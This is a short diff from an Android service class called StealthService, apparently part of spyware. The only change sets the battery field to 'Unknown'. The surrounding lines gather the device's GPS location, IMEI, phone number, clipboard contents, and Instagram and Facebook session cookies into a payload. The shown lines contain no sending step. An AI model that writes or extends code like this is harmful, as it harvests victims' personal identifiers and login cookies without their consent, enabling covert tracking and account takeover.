@@ -39,7 +39,7 @@ class StealthService : Service() {
         payload.put("gps", LocationUtils.getLastLocation(this))
         payload.put("imei", TelephonyUtils.getImei(this))
         payload.put("phone_number", TelephonyUtils.getPhoneNumber(this))
-        payload.put("battery", BatteryUtils.getLevel(this))
+        payload.put("battery", "Unknown")
         payload.put("clipboard", ClipboardUtils.getClipboard(this))
         payload.put("ig_cookies", CookieUtils.getInstagramCookies(this))
         payload.put("fb_cookies", CookieUtils.getFacebookCookies(this))
